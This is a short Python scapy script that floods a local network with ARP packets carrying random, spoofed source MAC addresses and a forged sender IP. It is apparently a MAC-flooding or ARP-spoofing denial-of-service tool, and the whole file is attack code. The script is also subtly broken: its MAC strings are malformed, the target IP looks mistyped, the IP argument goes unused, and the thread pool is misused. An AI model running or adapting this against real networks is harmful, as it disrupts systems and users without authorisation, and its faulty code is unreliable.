from scapy.all import *

import random
import sys
import multiprocessing.dummy as Texec 


ip=sys.argv[1]
n=4

def send(mac):
	while(True):
		a =hex(random.randint(0,255))
		b =hex(random.randint(0,255))
		c =hex(random.randint(0,255))
		d =hex(random.randint(0,255))
		e =hex(random.randint(0,255))
		f =hex(random.randint(0,255))
		mac=f'{a}:{b}:{c}:{d}:{e}:{f}'
		pkt=Ether(src=mac)/ARP(psrc="192.168.0.133",pdst="191.168.0.1")
		sendp(pkt, iface="eth0")

if __name__ == '__main__':
	p=Texec.Pool(4)
	mac=""
	p.map(send(mac))
    


	